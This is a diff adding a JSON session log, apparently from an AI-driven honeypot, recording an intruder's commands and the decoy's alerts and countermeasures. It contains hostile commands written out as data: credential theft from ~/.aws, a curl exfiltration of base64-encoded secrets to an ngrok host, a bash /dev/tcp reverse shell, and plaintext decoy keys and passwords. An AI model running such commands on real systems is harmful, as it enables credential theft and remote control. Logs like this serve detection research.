@@ -1,0 +1,306 @@
+{
+  "id": "929cc12a-04e3-465a-a697-1638f8de071f",
+  "engagement_id": "8d1bd057-9014-4719-be4d-c9f56b9199ad",
+  "connection_count": 1,
+  "claimed_user": "jdoe",
+  "source_ip": "127.0.0.1",
+  "first_seen_at": 1778544080.8817575,
+  "started_at": 1778544080.8817575,
+  "ended_at": 1778545042.4372425,
+  "duration_s": 961.56,
+  "engagement_duration_s": 961.56,
+  "restored_from_state": false,
+  "command_count": 28,
+  "observed": {
+    "ran_sudo": true,
+    "services_probed": [
+      "mysql"
+    ],
+    "attempted_lateral": true,
+    "found_crown_jewel": true,
+    "isolated": true,
+    "planted_sudo_cve": true,
+    "spawned_mysql": true,
+    "credential_files_read": [
+      "/home/jdoe/.aws/config",
+      "/home/jdoe/.aws/credentials"
+    ],
+    "honeytoken_modifications": [
+      "/home/jdoe/.aws/credentials"
+    ],
+    "honeytoken_deletions": [],
+    "payload_drops": [
+      "/tmp/stolen.txt"
+    ],
+    "ssh_persistence_attempt": false,
+    "bash_history_inspected": false,
+    "credential_search_attempted": false,
+    "credential_search_terms": [],
+    "reverse_shell_attempted": true,
+    "reverse_shell_command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "dns_exfil_attempted": true,
+    "dns_exfil_commands": [
+      "curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)"
+    ],
+    "lateral_to_decoy": true,
+    "decoy_targets": [
+      "db-prod",
+      "db-prod-01"
+    ],
+    "log_tampering": false,
+    "tampering_commands": [],
+    "attempted_sudo_elevation": true,
+    "decoys_planted": [
+      "/etc/mysql/my.cnf",
+      "/etc/sudoers.d/zzz_compat"
+    ],
+    "decoys_swallowed": [
+      "/etc/mysql/my.cnf"
+    ],
+    "alerted_ssh_persistence": false,
+    "alerted_honeytoken_tamper": true,
+    "alerted_credential_exfil": true,
+    "alerted_payload_staging": false,
+    "alerted_credential_search": false,
+    "alerted_reverse_shell": true,
+    "alerted_dns_exfil": true,
+    "alerted_lateral_decoy": true,
+    "alerted_log_tampering": false,
+    "alerted_decoy_swallowed": true
+  },
+  "actions_taken": [
+    {
+      "ts_offset_s": 123.53,
+      "triggered_by": "cat config",
+      "action": "alert_credential_exfil",
+      "severity": "high",
+      "rationale": "Attacker read planted credentials: ['/home/jdoe/.aws/config']. Recommend: force password reset / key rotation for the real account."
+    },
+    {
+      "ts_offset_s": 369.29,
+      "triggered_by": "sudo -i",
+      "action": "plant_sudo_vulnerability",
+      "severity": "info",
+      "rationale": "Attacker invoked sudo; plant a fake CVE-2021-3156-style misconfig."
+    },
+    {
+      "ts_offset_s": 466.89,
+      "triggered_by": "cat /etc/mysql/my.cnf",
+      "action": "spawn_fake_mysql",
+      "severity": "info",
+      "rationale": "Attacker probed for MySQL; spawn a decoy mysqld on 3306."
+    },
+    {
+      "ts_offset_s": 466.89,
+      "triggered_by": "cat /etc/mysql/my.cnf",
+      "action": "alert_decoy_swallowed",
+      "severity": "medium",
+      "rationale": "Attacker engaged with planted decoy(s): ['/etc/mysql/my.cnf']. The deception's working \u2014 they're following the planted trail."
+    },
+    {
+      "ts_offset_s": 517.26,
+      "triggered_by": "ssh db-prod-01",
+      "action": "alert_lateral_decoy",
+      "severity": "high",
+      "rationale": "Attacker attempted lateral movement to decoy host(s): ['db-prod', 'db-prod-01']. The hostnames only exist in the persona's local config \u2014 strong attacker signal."
+    },
+    {
+      "ts_offset_s": 517.26,
+      "triggered_by": "ssh db-prod-01",
+      "action": "isolate_session",
+      "severity": "medium",
+      "rationale": "Lateral movement attempt detected; constrain the session subnet."
+    },
+    {
+      "ts_offset_s": 611.07,
+      "triggered_by": "curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)",
+      "action": "alert_dns_exfil",
+      "severity": "high",
+      "rationale": "Attacker is exfiltrating via curl/wget to a suspicious destination: ['curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)']. Recommend: block destination domains at the egress, capture DNS queries for IOC export."
+    },
+    {
+      "ts_offset_s": 651.94,
+      "triggered_by": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "action": "alert_reverse_shell",
+      "severity": "critical",
+      "rationale": "Attacker invoked a reverse shell idiom: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'. Active C2 establishment. Recommend: kill session immediately, capture netflow, snapshot the decoy container for forensics."
+    },
+    {
+      "ts_offset_s": 683.38,
+      "triggered_by": "echo \"STOLEN_TOKEN\" > ~/.aws/credentials",
+      "action": "alert_honeytoken_tamper",
+      "severity": "high",
+      "rationale": "Attacker modified or deleted planted honeytoken(s): ['/home/jdoe/.aws/credentials']. Likely covering tracks or staging malicious content."
+    }
+  ],
+  "commands": [
+    {
+      "ts": 1778544169.0373492,
+      "cmd": "ls -al",
+      "response_source": "ls",
+      "response_preview": "total 44\ndrwxr-xr-x 5 jdoe jdoe   4096 May 11 09:14 .\ndrwxr-xr-x 3 jdoe jdoe   4096 May 11 09:14 ..\ndrwx------ 1 jdoe jdoe   4096 May 11 09:14 .aws\ndrwx------ 1 jdoe jdoe   4096 May 11 09:14 .ssh\ndrwx"
+    },
+    {
+      "ts": 1778544186.6254647,
+      "cmd": "cd .aws",
+      "response_source": "builtin",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778544191.6004329,
+      "cmd": "ls",
+      "response_source": "ls",
+      "response_preview": "config  credentials\n"
+    },
+    {
+      "ts": 1778544204.4137359,
+      "cmd": "cat config",
+      "response_source": "vfs-read",
+      "response_preview": "[default]\nregion = us-east-1\noutput = json\n\n[profile staging]\nregion = us-east-1\noutput = json\n"
+    },
+    {
+      "ts": 1778544225.0986884,
+      "cmd": "cat credentials",
+      "response_source": "vfs-read",
+      "response_preview": "[default]\naws_access_key_id = AKIA3PSWHWDCQCRH29VQ\naws_secret_access_key = u0NA3U707V7Jc3dWzKvHUv9rKO+DGboFvY95swXE\nregion = us-east-1\n\n[staging]\naws_access_key_id = AKIARKMHTT22E1MBGASG\naws_secret_ac"
+    },
+    {
+      "ts": 1778544238.0376606,
+      "cmd": "cd..",
+      "response_source": "llm",
+      "response_preview": "/home/jdoe"
+    },
+    {
+      "ts": 1778544243.6687112,
+      "cmd": "cd..",
+      "response_source": "llm",
+      "response_preview": "/home/jdoe"
+    },
+    {
+      "ts": 1778544250.1057725,
+      "cmd": "cd.",
+      "response_source": "llm",
+      "response_preview": "/home/jdoe"
+    },
+    {
+      "ts": 1778544256.153535,
+      "cmd": "cd.",
+      "response_source": "llm",
+      "response_preview": "/home/jdoe"
+    },
+    {
+      "ts": 1778544263.336668,
+      "cmd": "ls",
+      "response_source": "ls",
+      "response_preview": "config  credentials\n"
+    },
+    {
+      "ts": 1778544269.2951245,
+      "cmd": "cd.",
+      "response_source": "llm",
+      "response_preview": ".\n.. projects notes.md .ssh .aws .profile .bashrc"
+    },
+    {
+      "ts": 1778544279.4361467,
+      "cmd": "ls -al",
+      "response_source": "ls",
+      "response_preview": "total 16\ndrwxr-xr-x 5 jdoe jdoe   4096 May 11 09:14 .\ndrwxr-xr-x 3 jdoe jdoe   4096 May 11 09:14 ..\n-rw-r--r-- 1 jdoe jdoe   1024 May 11 09:14 config\n-rw-r--r-- 1 jdoe jdoe   1024 May 11 09:14 credent"
+    },
+    {
+      "ts": 1778544312.8908434,
+      "cmd": "cat ~/.aws/credentials",
+      "response_source": "vfs-read",
+      "response_preview": "[default]\naws_access_key_id = AKIA3PSWHWDCQCRH29VQ\naws_secret_access_key = u0NA3U707V7Jc3dWzKvHUv9rKO+DGboFvY95swXE\nregion = us-east-1\n\n[staging]\naws_access_key_id = AKIARKMHTT22E1MBGASG\naws_secret_ac"
+    },
+    {
+      "ts": 1778544338.5361536,
+      "cmd": "cp ~/.aws/credentials /tmp/stolen.txt",
+      "response_source": "vfs-cp",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778544345.8277495,
+      "cmd": "ls",
+      "response_source": "ls",
+      "response_preview": "config  credentials\n"
+    },
+    {
+      "ts": 1778544363.3916314,
+      "cmd": "ls credentials",
+      "response_source": "llm",
+      "response_preview": "ls: cannot access 'credentials': No such file or directory"
+    },
+    {
+      "ts": 1778544387.886817,
+      "cmd": "cd /tmp",
+      "response_source": "builtin",
+      "response_preview": ""
+    },
+    {
+      "ts": 1778544390.3082397,
+      "cmd": "ls",
+      "response_source": "ls",
+      "response_preview": "stolen.txt\n"
+    },
+    {
+      "ts": 1778544401.4593036,
+      "cmd": "cat stolen.txt",
+      "response_source": "vfs-read",
+      "response_preview": "[default]\naws_access_key_id = AKIA3PSWHWDCQCRH29VQ\naws_secret_access_key = u0NA3U707V7Jc3dWzKvHUv9rKO+DGboFvY95swXE\nregion = us-east-1\n\n[staging]\naws_access_key_id = AKIARKMHTT22E1MBGASG\naws_secret_ac"
+    },
+    {
+      "ts": 1778544453.1837378,
+      "cmd": "sudo -i",
+      "response_source": "llm",
+      "response_preview": "[sudo] password for jdoe:"
+    },
+    {
+      "ts": 1778544478.9577565,
+      "cmd": "ls /etc/sudoers.d",
+      "response_source": "ls",
+      "response_preview": "zzz_compat\n"
+    },
+    {
+      "ts": 1778544501.6860926,
+      "cmd": "cat zzz_compat",
+      "response_source": "llm",
+      "response_preview": "cat: zzz_compat: No such file or directory"
+    },
+    {
+      "ts": 1778544523.169515,
+      "cmd": "whoami",
+      "response_source": "cache",
+      "response_preview": "jdoe\n"
+    },
+    {
+      "ts": 1778544547.7717283,
+      "cmd": "cat /etc/mysql/my.cnf",
+      "response_source": "vfs-read",
+      "response_preview": "[client]\nuser     = root\npassword = M3taD4ta!2026\nhost     = billing-db\nport     = 3306\ndatabase = billing\n\n[mysqldump]\nuser     = backup_admin\npassword = nightly_backup_2026!\n\n[mysqld]\nbind-address  "
+    },
+    {
+      "ts": 1778544612.7252681,
+      "cmd": "ssh db-prod-01",
+      "response_source": "llm",
+      "response_preview": "```\nssh jdoe@10.20.30.41\nPTY allocation request failed on channel 0\nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-76-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     ht"
+    },
+    {
+      "ts": 1778544693.8072145,
+      "cmd": "curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)",
+      "response_source": "llm",
+      "response_preview": "curl: (37) Could not resolve host: /"
+    },
+    {
+      "ts": 1778544736.0074868,
+      "cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "response_source": "llm",
+      "response_preview": "/bin/bash: connect: Connection established"
+    },
+    {
+      "ts": 1778544764.2592955,
+      "cmd": "echo \"STOLEN_TOKEN\" > ~/.aws/credentials",
+      "response_source": "vfs-write",
+      "response_preview": ""
+    }
+  ]
+}
